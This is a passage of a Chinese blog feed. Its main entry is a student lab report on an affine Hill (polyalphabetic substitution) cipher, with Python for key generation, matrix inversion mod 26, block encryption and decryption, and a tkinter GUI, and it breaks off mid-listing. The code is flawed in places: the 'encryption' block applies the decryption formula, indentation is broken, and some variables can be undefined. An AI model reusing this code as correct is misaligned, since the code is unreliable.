缓存器，来源操作数必须是字组整数或短整数形态的变数</strong></td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>现代密码学之多表加密</title>
      <link href="/2019/09/09/%E2%95%A7%E2%95%93%E2%94%A4%C2%B7%E2%94%9C%E2%96%84%E2%94%AC%CE%B4%E2%95%A4%C2%BA%E2%95%93%C2%AB%E2%95%A2%CE%B1%E2%96%92%CF%86%E2%95%9D%E2%95%99%E2%94%9C%E2%96%84/"/>
      <url>/2019/09/09/%E2%95%A7%E2%95%93%E2%94%A4%C2%B7%E2%94%9C%E2%96%84%E2%94%AC%CE%B4%E2%95%A4%C2%BA%E2%95%93%C2%AB%E2%95%A2%CE%B1%E2%96%92%CF%86%E2%95%9D%E2%95%99%E2%94%9C%E2%96%84/</url>
      
        <content type="html"><![CDATA[<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><ul><li>根据扩展欧几里得算法实现求乘法逆元模块</li><li>根据分组长度n, 生成密钥(A,B)。即可逆矩阵A和向量B。生成的密钥要有随机性，密钥以文件形式存储</li><li>生成A的逆矩阵A-1</li><li>实现多表代换加密、解密模块</li><li>实现加密解密软件基本的可视化界面，能够对输入文本框的英文字符串进行加密解密，能够对文本文件中的文本进行加密解密</li><li>附加内容<ul><li>对长度不是n的倍数的明文的处理，能够对长度不是n的倍数的明文进行加密解密</li><li>对空格和标点符号的处理。要求解密时能还原空格和标点符号</li></ul></li></ul><h2 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h2><p>多表代换密码实现加密过程主要可以分为以下几个步骤：</p><ul><li>随机生成n*n的可逆矩阵A，且满足A的行列式与所定模N互素，作为密钥A</li><li>随机生成n*1的矩阵B，作为密钥B</li><li>对所需明文就行分组</li><li>通过<code>Ci≡AMi+B(mod 26)</code>加密变换求出密文</li></ul><p>多表代换密码实现解密过程主要可以分为以下几个步骤：</p><ul><li>对输入的密钥A作为矩阵A，求出矩阵A的逆矩阵</li><li>对密文进行分组</li><li>通过<code>Mi≡A−1(Ci−B)(mod 26)</code>解密变换求出明文</li></ul><h2 id="软件系统设计"><a href="#软件系统设计" class="headerlink" title="软件系统设计"></a>软件系统设计</h2><h3 id="随机生成矩阵"><a href="#随机生成矩阵" class="headerlink" title="随机生成矩阵"></a>随机生成矩阵</h3><p>此部分主要介绍如何随机生成可逆矩阵A和矩阵B作为密钥A和密钥B，同时实现将密钥作为文件保存</p><h4 id="可逆矩阵A"><a href="#可逆矩阵A" class="headerlink" title="可逆矩阵A"></a>可逆矩阵A</h4><blockquote><p>生成可逆矩阵A的主要方法为：用单位矩阵进行初等变换而成</p></blockquote><h5 id="生成单位矩阵"><a href="#生成单位矩阵" class="headerlink" title="生成单位矩阵"></a>生成单位矩阵</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getIdentityMatrix</span><span class="params">(n)</span>:</span><span class="comment">#生成单位矩阵</span></span><br><span class="line">    A = np.zeros((n,n))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">            <span class="keyword">if</span> i == j:</span><br><span class="line">                A[i][j] = <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                A[i][j] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> A</span><br></pre></td></tr></table></figure><p>这没有什么可以讲的很简单</p><h5 id="生成随机可逆矩阵A"><a href="#生成随机可逆矩阵A" class="headerlink" title="生成随机可逆矩阵A"></a>生成随机可逆矩阵A</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getInvertibleMatrix</span><span class="params">(n,m)</span>:</span><span class="comment">#生成可逆矩阵</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        A = getIdentityMatrix(n)</span><br><span class="line">        tempArray = np.zeros(n)</span><br><span class="line">        B = np.zeros((n,n))</span><br><span class="line">        transformTime = int(random.randint(<span class="number">0</span>,<span class="number">1000</span>))</span><br><span class="line">        maxint = sys.maxsize</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(transformTime):</span><br><span class="line">            mainRowNum = int((random.randint(<span class="number">0</span>,n) % (n - <span class="number">1</span>)))<span class="comment">#选择一个主行作初等行变换</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(n):</span><br><span class="line">                <span class="comment">#元素数值是否会溢出</span></span><br><span class="line">                <span class="keyword">if</span> maxint - (A[mainRowNum][k])*(int(random.randint(<span class="number">0</span>,<span class="number">10</span>))) &lt; <span class="number">0</span> <span class="keyword">and</span> maxint*(<span class="number">-1</span>) - (A[mainRowNum][k])*(int(random.randint(<span class="number">0</span>,<span class="number">10</span>))) &gt; tempArray[k]:</span><br><span class="line">                    tempArray[k] = A[mainRowNum][k]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    tempArray[k] = (A[mainRowNum][k]*(int(random.randint(<span class="number">0</span>,<span class="number">10</span>))))%m</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">                <span class="keyword">if</span> mainRowNum != j:</span><br><span class="line">                    <span class="keyword">for</span> k <span class="keyword">in</span> range(n):</span><br><span class="line">                        <span class="keyword">if</span> maxint - A[j][k]&lt; tempArray[k] <span class="keyword">and</span> maxint * (<span class="number">-1</span>) - (A[j][k]) &gt; tempArray[k]:</span><br><span class="line">                            A[j][k] = (A[j][k]/<span class="number">4</span>)%m</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            A[j][k] = (A[j][k] + tempArray[k])%m</span><br><span class="line">        <span class="keyword">if</span> gcd(np.linalg.det(A),m) == <span class="number">1</span> <span class="keyword">and</span> np.linalg.det(A) &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> A</span><br></pre></td></tr></table></figure><p>其中<code>transformTime</code>为随机决定初等行变换的次数，关键是要确保<strong>矩阵A的行列式与所定模N互素</strong></p><p>故需要此限定的条件：<code>gcd(np.linalg.det(A),m) == 1 and np.linalg.det(A)</code></p><h4 id="矩阵B"><a href="#矩阵B" class="headerlink" title="矩阵B"></a>矩阵B</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">B = np.zeros((n, <span class="number">1</span>))</span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> range(n):</span><br><span class="line">B[row] = int(random.randint(<span class="number">0</span>, <span class="number">26</span>))</span><br></pre></td></tr></table></figure><p>这没有什么可以讲的很简单</p><h3 id="明文分组加密"><a href="#明文分组加密" class="headerlink" title="明文分组加密"></a>明文分组加密</h3><h4 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h4><h5 id="记录空格和符号"><a href="#记录空格和符号" class="headerlink" title="记录空格和符号"></a>记录空格和符号</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">klist = np.zeros(len(clear))</span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(clear)):</span><br><span class="line">            <span class="keyword">if</span> clear[i] == <span class="string">' '</span>:</span><br><span class="line">                klist[index] = int(i)</span><br><span class="line">                index = index + <span class="number">1</span></span><br><span class="line">dlist = np.zeros(len(clear))</span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(clear)):</span><br><span class="line"><span class="keyword">if</span> clear[i] == <span class="string">','</span>:</span><br><span class="line">        dlist[index] = int(i)</span><br><span class="line">            index = index + <span class="number">1</span></span><br></pre></td></tr></table></figure><h5 id="字符串初始化转换为纯字母序列"><a href="#字符串初始化转换为纯字母序列" class="headerlink" title="字符串初始化转换为纯字母序列"></a>字符串初始化转换为纯字母序列</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(clear)):</span><br><span class="line">        <span class="keyword">if</span> clear[i] == <span class="string">','</span>:</span><br><span class="line">            clear[i] = <span class="string">' '</span></span><br><span class="line">    <span class="keyword">while</span> <span class="string">' '</span> <span class="keyword">in</span> clear:</span><br><span class="line">        clear.remove(<span class="string">' '</span>)</span><br></pre></td></tr></table></figure><h4 id="补位操作"><a href="#补位操作" class="headerlink" title="补位操作"></a>补位操作</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (lenth % n == <span class="number">0</span>):</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">        offset = n - lenth % n</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(offset):</span><br><span class="line">        CipherText.append(<span class="string">'A'</span>)</span><br><span class="line">    groups = int(len(CipherText) / n)</span><br></pre></td></tr></table></figure><h4 id="生成M序列"><a href="#生成M序列" class="headerlink" title="生成M序列"></a>生成M序列</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">M = np.zeros((groups, n))</span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> range(groups):</span><br><span class="line">        <span class="keyword">for</span> column <span class="keyword">in</span> range(n):</span><br><span class="line">            M[row][column] = CipherText[index]</span><br><span class="line">            index = index + <span class="number">1</span></span><br></pre></td></tr></table></figure><h4 id="分组加密"><a href="#分组加密" class="headerlink" title="分组加密"></a>分组加密</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(groups):<span class="comment">#实现矩阵乘法和矩阵加法，InA*(C-B)</span></span><br><span class="line">       tmp = np.zeros((n, <span class="number">1</span>))</span><br><span class="line">       tmpp = np.zeros((n, <span class="number">1</span>))</span><br><span class="line">       <span class="keyword">for</span> row <span class="keyword">in</span> range(n):<span class="comment">#初始化Mi</span></span><br><span class="line">           tmp[row][<span class="number">0</span>] = M[i][row]</span><br><span class="line">       <span class="keyword">for</span> row <span class="keyword">in</span> range(n):  <span class="comment"># 实现C-B</span></span><br><span class="line">           tmp[row][<span class="number">0</span>] = tmp[row][<span class="number">0</span>] - B[row][<span class="number">0</span>]</span><br><span class="line">       <span class="keyword">for</span> row <span class="keyword">in</span> range(n):<span class="comment">#实现InA*(C-B)mod(N)</span></span><br><span class="line">           <span class="keyword">for</span> column <span class="keyword">in</span> range(n):</span><br><span class="line">               tmpp[row][<span class="number">0</span>] = int(tmpp[row][<span class="number">0</span>] + (int(tmp[column][<span class="number">0</span>]) * int(A[row][column])))</span><br><span class="line">           tmpp[row][<span class="number">0</span>] = int((tmpp[row][<span class="number">0</span>]) % N)</span><br><span class="line">       <span class="keyword">for</span> row <span class="keyword">in</span> range(n):</span><br><span class="line">           clearlist.append(NtoA(int(tmpp[row][<span class="number">0</span>])))</span><br></pre></td></tr></table></figure><h4 id="消除补位影响"><a href="#消除补位影响" class="headerlink" title="消除补位影响"></a>消除补位影响</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(offset):<span class="comment">#消除补位影响</span></span><br><span class="line">            <span class="keyword">del</span> clearlist[<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><h3 id="逆矩阵"><a href="#逆矩阵" class="headerlink" title="逆矩阵"></a>逆矩阵</h3><h5 id="逆元"><a href="#逆元" class="headerlink" title="逆元"></a>逆元</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">InverseElement</span><span class="params">(b,p)</span>:</span><span class="comment">#求逆元</span></span><br><span class="line">    inv = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> (inv*b)%p == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        inv = inv +<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> inv</span><br></pre></td></tr></table></figure><h5 id="行列式"><a href="#行列式" class="headerlink" title="行列式"></a>行列式</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Det</span><span class="params">(a,n)</span>:</span><span class="comment">#求行列式</span></span><br><span class="line">    b = np.zeros((n, n))<span class="comment">#临时数组用于降阶</span></span><br><span class="line">    sum = int(<span class="number">0</span>)</span><br><span class="line">    sign = int(<span class="number">0</span>)</span><br><span class="line">    p = int(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> a[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):<span class="comment">#此处大循环实现将余子式存入数组b中</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> range(n<span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(n<span class="number">-1</span>):</span><br><span class="line">                <span class="keyword">if</span> c&lt;i:</span><br><span class="line">                    p = <span class="number">0</span><span class="comment">#当p=0时，行列式只向左移，即消去对应的第一列的数</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    p = <span class="number">1</span><span class="comment">#否则行列式左移后再上移</span></span><br><span class="line">                b[c][j]=a[c+p][j+<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> i%<span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            sign = <span class="number">1</span><span class="comment">#i为偶数，加法</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sign = <span class="number">-1</span><span class="comment">#i为奇数，减法</span></span><br><span class="line">        sum = sum + a[i][<span class="number">0</span>]*Det(b,n<span class="number">-1</span>)*sign<span class="comment">#计算行列式的值</span></span><br><span class="line">    <span class="keyword">return</span>  sum</span><br></pre></td></tr></table></figure><h5 id="伴随矩阵"><a href="#伴随矩阵" class="headerlink" title="伴随矩阵"></a>伴随矩阵</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAStart</span><span class="params">(arcs,n,ans)</span>:</span><span class="comment">#计算每一行每一列的每个元素所对应的余子式，组成A*</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        ans[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">    temp = np.zeros((n, n))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(n<span class="number">-1</span>):</span><br><span class="line">                <span class="keyword">for</span> t <span class="keyword">in</span> range(n<span class="number">-1</span>):</span><br><span class="line">                    temp[k][t] = arcs[(k+<span class="number">1</span> <span class="keyword">if</span> k&gt;=i <span class="keyword">else</span> k)][(t+<span class="number">1</span> <span class="keyword">if</span> t&gt;=j <span class="keyword">else</span> t)]</span><br><span class="line">                ans[j][i] = Det(temp,n<span class="number">-1</span>)</span><br><span class="line">                <span class="keyword">if</span> (i+j)%<span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">                    ans[j][i] = -ans[j][i]</span><br></pre></td></tr></table></figure><h5 id="逆矩阵-1"><a href="#逆矩阵-1" class="headerlink" title="逆矩阵"></a>逆矩阵</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">InverseMat</span><span class="params">(a,n,p,ans)</span>:</span></span><br><span class="line">    astar = np.zeros((n, n))</span><br><span class="line">    getAStart(a, n, astar)<span class="comment">#求A的伴随矩阵</span></span><br><span class="line">    deta = int(Det(a,n))<span class="comment">#求A的行列式</span></span><br><span class="line">    <span class="keyword">if</span> deta &lt; <span class="number">0</span>:</span><br><span class="line">        deta = deta + p</span><br><span class="line">    inv = int(InverseElement(deta,p))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">            ans[i][j] = astar[i][j]*inv</span><br><span class="line">            ans[i][j] = ans[i][j]%p</span><br><span class="line">            <span class="keyword">if</span> ans[i][j] &lt;<span class="number">0</span>:</span><br><span class="line">                ans[i][j] = ans[i][j] + p</span><br></pre></td></tr></table></figure><h3 id="密文分组解密"><a href="#密文分组解密" class="headerlink" title="密文分组解密"></a>密文分组解密</h3><h5 id="补位操作-1"><a href="#补位操作-1" class="headerlink" title="补位操作"></a>补位操作</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (lenth % n == <span class="number">0</span>):</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">        offset = n - lenth % n</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(offset):</span><br><span class="line">        CipherText.append(<span class="string">'A'</span>)</span><br><span class="line">    groups = int(len(CipherText) / n)</span><br></pre></td></tr></table></figure><h5 id="生成M序列-1"><a href="#生成M序列-1" class="headerlink" title="生成M序列"></a>生成M序列</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">M = np.zeros((groups, n))</span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> range(groups):</span><br><span class="line">        <span class="keyword">for</span> column <span class="keyword">in</span> range(n):</span><br><span class="line">            M[row][column] = CipherText[index]</span><br><span class="line">            index = index + <span class="number">1</span></span><br></pre></td></tr></table></figure><h5 id="分组解密"><a href="#分组解密" class="headerlink" title="分组解密"></a>分组解密</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(groups):<span class="comment">#实现矩阵乘法和矩阵加法，InA*(C-B)</span></span><br><span class="line">        tmp = np.zeros((n, <span class="number">1</span>))</span><br><span class="line">        tmpp = np.zeros((n, <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> range(n):<span class="comment">#初始化Mi</span></span><br><span class="line">            tmp[row][<span class="number">0</span>] = M[i][row]</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> range(n):  <span class="comment"># 实现C-B</span></span><br><span class="line">            tmp[row][<span class="number">0</span>] = tmp[row][<span class="number">0</span>] - B[row][<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> range(n):<span class="comment">#实现InA*(C-B)mod(N)</span></span><br><span class="line">            <span class="keyword">for</span> column <span class="keyword">in</span> range(n):</span><br><span class="line">                tmpp[row][<span class="number">0</span>] = int(tmpp[row][<span class="number">0</span>] + (int(tmp[column][<span class="number">0</span>]) * int(A[row][column])))</span><br><span class="line">            tmpp[row][<span class="number">0</span>] = int((tmpp[row][<span class="number">0</span>]) % N)</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> range(n):</span><br><span class="line">            clearlist.append(NtoA(int(tmpp[row][<span class="number">0</span>])))</span><br></pre></td></tr></table></figure><h5 id="消除补位影响-1"><a href="#消除补位影响-1" class="headerlink" title="消除补位影响"></a>消除补位影响</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(offset):<span class="comment">#消除补位影响</span></span><br><span class="line">            <span class="keyword">del</span> clearlist[<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><h3 id="GUI图形界面最终实现"><a href="#GUI图形界面最终实现" class="headerlink" title="GUI图形界面最终实现"></a>GUI图形界面最终实现</h3><p>GUI的实现使用的<strong>Python</strong>自带的<strong>tkinter</strong>库,实现了错误提示框的弹出和各类操作可视化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span 